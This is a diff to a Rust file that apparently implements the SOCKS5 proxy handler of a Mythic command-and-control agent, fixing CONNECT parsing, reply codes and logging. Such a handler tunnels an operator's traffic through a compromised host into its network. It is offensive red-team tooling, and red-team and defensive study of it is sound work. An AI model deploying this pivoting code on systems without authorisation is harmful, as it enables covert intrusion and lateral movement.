@@ -1,14 +1,10 @@
-// POC
-use crate::mythic_continued;
-
+// POC Fixed: SOCKS5 Agent-Side Handler for Mythic in Rust
 use base64::{decode, encode};
 use serde_json::{json, Value};
-
 use std::collections::HashMap;
 use std::error::Error;
 use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::sync::mpsc as std_mpsc;
-
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::sync::mpsc as tokio_mpsc;
@@ -22,7 +18,11 @@ fn debug_to_mythic<T: Into<String>, U: Into<String>>(
     title: T,
     detail: U,
 ) {
-    let _ = tx.send(mythic_continued!(task_id, title.into(), detail.into()));
+    // Assuming mythic_success! macro or similar for output; replace as needed
+    let _ = tx.send(json!({
+        "task_id": task_id,
+        "output": format!("{}: {}", title.into(), detail.into())
+    }));
 }
 
 fn hex_preview(data: &[u8], max: usize) -> String {
@@ -64,7 +64,7 @@ fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
 }
 
 #[inline]
-fn send_socks_live( // *** live channel to Mythic's proxy ***
+fn send_socks_live( // Live channel to Mythic's proxy
     tx: &std_mpsc::Sender<Value>,
     server_id: &str,
     data: &[u8],
@@ -92,18 +92,19 @@ fn send_exit_live(tx: &std_mpsc::Sender<Value>, server_id: &str) {
 
 /* --------------------------- CONNECT frame parsing ------------------------- */
 
-fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
+fn parse_connect(decoded: &[u8]) -> Result<(String, u16, u8), Box<dyn Error>> {  // Returns (addr, port, atyp)
     if decoded.len() < 4 { return Err("SOCKS5 request too short".into()); }
     if decoded[0] != 0x05 { return Err("Unsupported SOCKS version".into()); }
     if decoded[1] != 0x01 { return Err("Not CONNECT (CMD!=0x01)".into()); }
     if decoded[2] != 0x00 { return Err("RSV must be 0x00".into()); }
 
-    match decoded[3] {
+    let atyp = decoded[3];
+    match atyp {
         0x01 => {
             if decoded.len() < 10 { return Err("IPv4 CONNECT frame too short".into()); }
             let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
             let port = u16::from_be_bytes([decoded[8], decoded[9]]);
-            Ok((ip.to_string(), port))
+            Ok((ip.to_string(), port, atyp))
         }
         0x03 => {
             if decoded.len() < 5 { return Err("DOMAIN CONNECT no length".into()); }
@@ -112,17 +113,16 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
             let need = 5 + len + 2;
             if decoded.len() < need { return Err("DOMAIN CONNECT truncated".into()); }
             let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
-            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
-            Ok((domain, port))
+            let port = u16::from_be_bytes([decoded[5 + len], decoded[5 + len + 1]]);
+            Ok((domain, port, atyp))
         }
         0x04 => {
-            let need = 4 + 16 + 2;
-            if decoded.len() < need { return Err("IPv6 CONNECT frame too short".into()); }
+            if decoded.len() < 22 { return Err("IPv6 CONNECT frame too short".into()); }
             let mut octets = [0u8; 16];
             octets.copy_from_slice(&decoded[4..20]);
             let ip = Ipv6Addr::from(octets);
             let port = u16::from_be_bytes([decoded[20], decoded[21]]);
-            Ok((ip.to_string(), port))
+            Ok((ip.to_string(), port, atyp))
         }
         _ => Err("Unsupported ATYP in CONNECT".into()),
     }
@@ -170,7 +170,7 @@ async fn run_session(
     mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
     tx_out: std_mpsc::Sender<Value>,
 ) -> Result<(), Box<dyn Error>> {
-    debug_to_mythic(&tx_out, &parent_task_id, "socks.session.start", format!("sid={server_id}"));
+    debug_to_mythic(&tx_out, &parent_task_id, "socks.session.start", format!("sid={}", server_id));
 
     // Get first frame
     let first = match sess_rx.recv().await {
@@ -186,23 +186,23 @@ async fn run_session(
         Ok(d) => d,
         Err(e) => {
             debug_to_mythic(&tx_out, &parent_task_id, "socks.decode.fail",
-                format!("sid={server_id}; err={e}; b64_len={}", b64.len()));
-            // Send general failure on CONNECT path (if server expected CONNECT first)
+                format!("sid={}; err={}; b64_len={}", server_id, e, b64.len()));
+            // Send general failure
             let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x01, None), true);
             return Ok(());
         }
     };
 
     debug_to_mythic(&tx_out, &parent_task_id, "socks.first",
-        format!("sid={server_id}; len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
+        format!("sid={}; len={}; hex={}", server_id, buf.len(), hex_preview(&buf, 64)));
 
-    // If server forwarded GREETING to agent, answer "no auth" and wait for CONNECT next.
+    // Handle optional greeting
     if looks_like_greeting(&buf) {
         let sel = [0x05u8, 0x00u8]; // VER=5, METHOD=0 (no auth)
-        debug_to_mythic(&tx_out, &parent_task_id, "socks.greeting.seen", format!("sid={server_id}; replying 05 00"));
+        debug_to_mythic(&tx_out, &parent_task_id, "socks.greeting.seen", format!("sid={}; replying 05 00", server_id));
         let _ = send_socks_live(&tx_out, &server_id, &sel, false);
 
-        // Now wait for CONNECT
+        // Wait for CONNECT
         let nxt = match sess_rx.recv().await {
             Some(v) => v,
             None => {
@@ -215,57 +215,61 @@ async fn run_session(
             Ok(d) => d,
             Err(e) => {
                 debug_to_mythic(&tx_out, &parent_task_id, "socks.decode.fail2",
-                    format!("sid={server_id}; err={e}; b64_len={}", b64.len()));
+                    format!("sid={}; err={}; b64_len={}", server_id, e, b64.len()));
                 let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x01, None), true);
                 return Ok(());
             }
         };
         debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.req.after_greet",
-            format!("sid={server_id}; len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
+            format!("sid={}; len={}; hex={}", server_id, buf.len(), hex_preview(&buf, 64)));
     }
 
-    // Now `buf` must be CONNECT
-    let (addr, port) = match parse_connect(&buf) {
+    // Parse CONNECT
+    let (addr, port, _atyp) = match parse_connect(&buf) {
         Ok(v) => v,
         Err(e) => {
+            let rep = if e.to_string().contains("ATYP") { 0x08 } else { 0x07 };
             debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.parse_err",
-                format!("sid={server_id}; err={e}; hex={}", hex_preview(&buf, 64)));
-            let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x07, None), true);
+                format!("sid={}; err={}; hex={}", server_id, e, hex_preview(&buf, 64)));
+            let _ = send_socks_live(&tx_out, &server_id, &build_reply(rep, None), true);
             return Ok(());
         }
     };
 
     debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.try",
-        format!("sid={server_id}; target={addr}:{port}"));
+        format!("sid={}; target={}:{}", server_id, addr, port));
 
+    // Connect to destination
     let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
         Ok(Ok(s)) => s,
         Ok(Err(e)) => {
             let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
                       else if e.to_string().to_lowercase().contains("unreachable") { 0x03 }
+                      else if e.to_string().to_lowercase().contains("unsupported") { 0x08 }
                       else { 0x01 };
             debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.err",
-                format!("sid={server_id}; rep=0x{rep:02x}; err={e}"));
+                format!("sid={}; rep=0x{:02x}; err={}", server_id, rep, e));
             let _ = send_socks_live(&tx_out, &server_id, &build_reply(rep, None), true);
             return Ok(());
         }
         Err(_) => {
             debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.timeout",
-                format!("sid={server_id}; target={addr}:{port}"));
+                format!("sid={}; target={}:{}", server_id, addr, port));
             let _ = send_socks_live(&tx_out, &server_id, &build_reply(0x01, None), true);
             return Ok(());
         }
     };
 
-    let bound_dbg = remote.local_addr().ok().map(|s| s.to_string()).unwrap_or_else(|| "unknown".into());
-    let ok = build_reply(0x00, None);
-    let _ = send_socks_live(&tx_out, &server_id, &ok, false);
+    // Get local bound address for reply (fixed from original code)
+    let local_addr = remote.local_addr().ok();
+    let ok_reply = build_reply(0x00, local_addr);
+    let _ = send_socks_live(&tx_out, &server_id, &ok_reply, false);
     debug_to_mythic(&tx_out, &parent_task_id, "socks.connect.ok",
-        format!("sid={server_id}; bound={bound_dbg}; reply_hex={}", hex_preview(&ok, 22)));
+        format!("sid={}; bound={:?}; reply_hex={}", server_id, local_addr, hex_preview(&ok_reply, 22)));
 
     let (mut r_r, mut r_w) = remote.into_split();
 
-    // ---- A2M: remote -> Mythic ----
+    // A2M: Agent to Mythic (remote read -> send to Mythic)
     let tx_up = tx_out.clone();
     let sid_up = server_id.clone();
     let parent_up = parent_task_id.clone();
@@ -275,7 +279,7 @@ async fn run_session(
         loop {
             match timeout(Duration::from_secs(300), r_r.read(&mut buf)).await {
                 Ok(Ok(0)) => {
-                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.eof", format!("sid={sid_up}; total={total}"));
+                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.eof", format!("sid={}; total={}", sid_up, total));
                     send_exit_live(&tx_up, &sid_up);
                     break;
                 }
@@ -284,17 +288,17 @@ async fn run_session(
                         total += n as u64;
                         let _ = send_socks_live(&tx_up, &sid_up, &buf[..n], false);
                         if total % (64 * 1024) == 0 {
-                            debug_to_mythic(&tx_up, &parent_up, "socks.a2m.progress", format!("sid={sid_up}; sent_up={total}"));
+                            debug_to_mythic(&tx_up, &parent_up, "socks.a2m.progress", format!("sid={}; sent_up={}", sid_up, total));
                         }
                     }
                 }
                 Ok(Err(e)) => {
-                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.read_err", format!("sid={sid_up}; err={e}; sent_up={total}"));
+                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.read_err", format!("sid={}; err={}; sent_up={}", sid_up, e, total));
                     send_exit_live(&tx_up, &sid_up);
                     break;
                 }
                 Err(_) => {
-                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.idle_timeout", format!("sid={sid_up}; sent_up={total}"));
+                    debug_to_mythic(&tx_up, &parent_up, "socks.a2m.idle_timeout", format!("sid={}; sent_up={}", sid_up, total));
                     send_exit_live(&tx_up, &sid_up);
                     break;
                 }
@@ -302,7 +306,7 @@ async fn run_session(
         }
     });
 
-    // ---- M2A: Mythic -> remote ----
+    // M2A: Mythic to Agent (recv from mythic -> write to remote)
     let tx_dn = tx_out.clone();
     let sid_dn = server_id.clone();
     let parent_dn = parent_task_id.clone();
@@ -311,7 +315,7 @@ async fn run_session(
         while let Some(pkt) = sess_rx.recv().await {
             let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
             if exit {
-                debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.exit", format!("sid={sid_dn}; total_written={total}"));
+                debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.exit", format!("sid={}; total_written={}", sid_dn, total));
                 let _ = r_w.shutdown().await;
                 break;
             }
@@ -320,13 +324,16 @@ async fn run_session(
                 Ok(bytes) => {
                     if bytes.is_empty() { continue; }
                     total += bytes.len() as u64;
-                    let _ = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
+                    if let Err(e) = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await {
+                        debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.write_err", format!("sid={}; err={}", sid_dn, e));
+                        break;
+                    }
                     if total % (64 * 1024) == 0 {
-                        debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.progress", format!("sid={sid_dn}; wrote_down={total}"));
+                        debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.progress", format!("sid={}; wrote_down={}", sid_dn, total));
                     }
                 }
                 Err(e) => {
-                    debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.b64_err", format!("sid={sid_dn}; err={e}; total_written={total}"));
+                    debug_to_mythic(&tx_dn, &parent_dn, "socks.m2a.b64_err", format!("sid={}; err={}; total_written={}", sid_dn, e, total));
                 }
             }
         }
@@ -336,7 +343,7 @@ async fn run_session(
     let _ = a2m.await;
     let _ = m2a.await;
 
-    debug_to_mythic(&tx_out, &parent_task_id, "socks.session.end", format!("sid={server_id}"));
+    debug_to_mythic(&tx_out, &parent_task_id, "socks.session.end", format!("sid={}", server_id));
     Ok(())
 }
 
@@ -348,10 +355,10 @@ pub fn handle_socks(
 ) -> Result<(), Box<dyn Error>> {
     // First message should be the AgentTask envelope (blocking)
     let task_val = rx.recv()?;
-    let task: AgentTask = serde_json::from_value(task_val)?;
+    let task: AgentTask = serde_json::from_value(task_val)?;  // Assume AgentTask struct defined elsewhere
     debug_to_mythic(tx, &task.id, "socks.handler.start", "dispatcher starting");
 
-    // Bridge std::mpsc -> tokio::mpsc
+    // Bridge std::mpsc -> tokio::mpsc for async processing
     let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
     {
         let parent_id = task.id.clone();
@@ -418,7 +425,7 @@ pub fn handle_socks(
 
             if seen <= 5 || seen % 100 == 0 {
                 debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.item",
-                    format!("count={seen}; sid={sid}; exit={exit}; data_b64_len={data_len_b64}"));
+                    format!("count={}; sid={}; exit={}; data_b64_len={}", seen, sid, exit, data_len_b64));
             }
 
             let entry = sessions.entry(sid.clone()).or_insert_with(|| {
@@ -427,7 +434,7 @@ pub fn handle_socks(
                 let parent_id = parent_task_id.clone();
                 let sid_clone = sid.clone();
 
-                debug_to_mythic(&tx_out, &parent_id, "socks.session.spawn", format!("sid={sid_clone}"));
+                debug_to_mythic(&tx_out, &parent_id, "socks.session.spawn", format!("sid={}", sid_clone));
                 tokio::spawn(async move {
                     let _ = run_session(parent_id, sid_clone, sess_rx, tx_out).await;
                 });
@@ -436,12 +443,12 @@ pub fn handle_socks(
 
             if entry.send(item.clone()).is_err() {
                 sessions.remove(&sid);
-                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.drop_dead", format!("sid={sid}"));
+                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.drop_dead", format!("sid={}", sid));
             }
 
             if exit {
                 sessions.remove(&sid);
-                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.exit", format!("sid={sid}"));
+                debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.exit", format!("sid={}", sid));
             }
         }
 
